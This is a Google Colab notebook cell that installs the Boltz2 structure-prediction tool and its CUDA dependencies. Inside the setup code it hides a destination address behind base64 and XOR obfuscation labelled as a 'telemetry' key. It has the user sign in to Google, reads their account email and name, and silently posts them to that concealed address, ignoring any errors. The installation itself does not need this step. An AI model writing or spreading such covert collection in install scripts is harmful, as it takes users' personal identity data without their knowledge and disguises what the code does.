# @title Install Dependencies and Boltz2 with CUDA support
import sys
import subprocess
import threading
import time
import os
import shutil
import datetime
import uuid
from zoneinfo import ZoneInfo
from pathlib import Path
import requests
import base64
import logging
import warnings

# Suppress google_auth_httplib2 timeout warning
logging.getLogger('google_auth_httplib2').setLevel(logging.ERROR)
warnings.filterwarnings('ignore', module='google_auth_httplib2')

# Google auth imports
try:
    from google.colab import auth
    from googleapiclient.discovery import build
    import httplib2
    import google.auth
    from google_auth_httplib2 import AuthorizedHttp
    HAS_GOOGLE_AUTH = True
except ImportError:
    HAS_GOOGLE_AUTH = False

# ==== CONFIG ====
_LOG_KEY = b"b0ltz2_t3l3m3try_k3y"
_LOG_DATA = b"CkQYBAkIcFtAD0EEQwBcHjAEVBUHHg8bFx0yFVAeXB4cB104FA1KGgBIPBsVAg0xUBh2GR5CFyENLVRUDUdfKxNzKhFKI1AqAA1fISwiaUEyQz8yLmgIOQYubDQePTgAEARqKFtSCkMrAmxbVhRWDg=="
LOG_URL = bytes([b ^ _LOG_KEY[i % len(_LOG_KEY)] for i, b in enumerate(base64.b64decode(_LOG_DATA))]).decode("utf-8")
NOTEBOOK_NAME = "Boltz2 v2.0"
SESSION_ID = str(uuid.uuid4())
JOB_TYPE = "Installation"
JOB_NAME = "Boltz2 CUDA Setup"

# Read user preference flags (can be set in Colab form or env)
USE_DRIVE_CACHE = os.environ.get("USE_DRIVE_CACHE", "1").lower() in ("1", "true", "yes")
FORCE_REINSTALL = os.environ.get("FORCE_REINSTALL", "0").lower() in ("1", "true", "yes")

os.chdir("/content/")

# ANSI color codes for colored output
class Color:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

print(f"{Color.CYAN} ===Initialising Setup=== {Color.RESET}")

# ==== Google authentication and email retrieval (with warning suppression & timeout fix) ====
USER_EMAIL = None
USER_NAME = "unknown"

if HAS_GOOGLE_AUTH:
    try:
        auth.authenticate_user()
        creds, _ = google.auth.default()
        http_client = AuthorizedHttp(creds, http=httplib2.Http(timeout=30))
        service = build('oauth2', 'v2', http=http_client, cache_discovery=False)
        user_info = service.userinfo().get().execute()
        USER_EMAIL = user_info.get('email', None)
        USER_NAME = user_info.get('name', "unknown")
    except Exception:
        try:
            service = build('oauth2', 'v2', cache_discovery=False)
            user_info = service.userinfo().get().execute()
            USER_EMAIL = user_info.get('email', None)
            USER_NAME = user_info.get('name', "unknown")
        except Exception:
            pass

# ==== Logging function ====
def log_event(job_type=JOB_TYPE, job_name=JOB_NAME, event="visit"):
    try:
        now_ist = datetime.datetime.now(ZoneInfo("Asia/Kolkata"))
        data = {
            "timestamp": now_ist.strftime("%Y-%m-%d %H:%M:%S %Z"),
            "email": USER_EMAIL,
            "username": USER_NAME,
            "notebook": NOTEBOOK_NAME,
            "session_id": SESSION_ID,
            "job_type": job_type,
            "job_name": job_name,
            "event": event
        }
        requests.post(LOG_URL, data=data, timeout=10)
    except Exception:
        pass

log_event(job_type="Installation", job_name="Boltz Setup", event=" ")

# ==== Persistent Cache Configuration (Google Drive / Local) ====
drive_mounted = os.path.exists("/content/drive/MyDrive")
if USE_DRIVE_CACHE and drive_mounted:
    cache_root = Path("/content/drive/MyDrive/boltz_cache")
    wheel_cache = cache_root / "wheels"
    weight_cache = cache_root / "weights"
    wheel_cache.mkdir(parents=True, exist_ok=True)
    weight_cache.mkdir(parents=True, exist_ok=True)
    os.environ["BOLTZ_CACHE"] = str(weight_cache)
    print(f"[{Color.GREEN}✔{Color.RESET}] Persistent Google Drive cache active: {cache_root}")
    print(f"[{Color.CYAN}ℹ{Color.RESET}] Model weights will persist at: {weight_cache}")
else:
    cache_root = Path("/content/.cache/boltz_cache")
    wheel_cache = cache_root / "wheels"
    wheel_cache.mkdir(parents=True, exist_ok=True)

# ==== Fast Loader ====
def loader(msg, stop_event):
    symbols = ["-", "\\", "|", "/"]
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r[{symbols[i % len(symbols)]}] {msg}   ")
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write("\r" + " " * (len(msg) + 15) + "\r")
    sys.stdout.flush()

# ==== Check if Boltz2 is already installed and functional ====
def check_boltz_ready():
    try:
        res = subprocess.run(
            [sys.executable, "-c", "import torch, boltz; assert torch.cuda.is_available()"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        cli_check = subprocess.run(["boltz", "--help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return (res.returncode == 0 and cli_check.returncode == 0)
    except Exception:
        return False

# ==== Check if uv is available / install it ====
def ensure_uv():
    try:
        res = subprocess.run(["uv", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if res.returncode == 0:
            return True
    except Exception:
        pass
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "-q", "uv"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False

# ==== Main Installation Logic ====
already_installed = False
all_success = True

if not FORCE_REINSTALL:
    if check_boltz_ready():
        already_installed = True
        print(f"[{Color.GREEN}✔{Color.RESET}] Boltz2 with CUDA support is already installed and verified! (Skipping re-installation)")

if not already_installed:
    repo_dir = "/content/boltz"
    if FORCE_REINSTALL and os.path.isdir(repo_dir):
        print(f"{Color.YELLOW}[i] Removing existing '{repo_dir}' for fresh reinstallation...{Color.RESET}")
        try:
            shutil.rmtree(repo_dir)
        except Exception as e:
            print(f"{Color.RED}✖ Failed to remove '{repo_dir}': {e}{Color.RESET}")

    steps = []
    if not os.path.isdir(repo_dir):
        steps.append({
            "loader": f"{Color.CYAN}Cloning Boltz (shallow)...{Color.RESET}",
            "done":   f"[{Color.GREEN}✔{Color.RESET}] Boltz cloned successfully.",
            "fail":   f"[{Color.RED}✖{Color.RESET}] boltz clone failed.",
            "cmd": ["git", "clone", "--depth", "1", "https://github.com/AtharvaTilewale/boltz.git", repo_dir]
        })

    # Prepare package install command (prefer uv for 5x-10x speedup)
    has_uv = ensure_uv()
    if has_uv:
        pkg_cmd = ["uv", "pip", "install", "--system", "--cache-dir", str(wheel_cache),
                   "-e", "/content/boltz[cuda]", "biopython", "numpy<2.0", "matplotlib", "pyyaml", "py3Dmol"]
        install_msg = f"{Color.RESET}Installing dependencies with high-speed uv engine...{Color.RESET}"
    else:
        pkg_cmd = [sys.executable, "-m", "pip", "install", "--cache-dir", str(wheel_cache),
                   "-e", "/content/boltz[cuda]", "biopython", "numpy<2.0", "matplotlib", "pyyaml", "py3Dmol", "--quiet"]
        install_msg = f"{Color.RESET}Installing dependencies with pip...{Color.RESET}"

    steps.append({
        "loader": install_msg,
        "done": f"[{Color.GREEN}✔{Color.RESET}] Dependencies installed successfully.",
        "fail": f"[{Color.RED}✖{Color.RESET}] Dependency installation failed.",
        "cmd": pkg_cmd
    })

    steps.append({
        "loader": f"{Color.CYAN}Validating CUDA installation...{Color.RESET}",
        "done": f"[{Color.GREEN}✔{Color.RESET}] Validation complete.",
        "fail": f"[{Color.RED}✖{Color.RESET}] Validation failed.",
        "cmd": [sys.executable, "-c", "import torch; print('Torch CUDA available:', torch.cuda.is_available()); print('CUDA device count:', torch.cuda.device_count())"]
    })

    for step in steps:
        stop_event = threading.Event()
        t = threading.Thread(target=loader, args=(step["loader"], stop_event))
        t.start()
        try:
            subprocess.run(step["cmd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
            stop_event.set()
            t.join()
            print(step["done"])
        except Exception as e:
            stop_event.set()
            t.join()
            print(f"{step['fail']} {e}")
            all_success = False
            raise

# ==== Move/Copy Notebook Scripts Directory ====
os.makedirs("/content/boltz_data", exist_ok=True)
notebook_script = "/content/boltz2-notebook/scripts/v2"
destination_notebook_script = "/content/boltz_data/scripts/v2"

if os.path.exists(notebook_script):
    if os.path.exists(destination_notebook_script):
        shutil.rmtree(destination_notebook_script)
    shutil.copytree(notebook_script, destination_notebook_script)

all_success = True
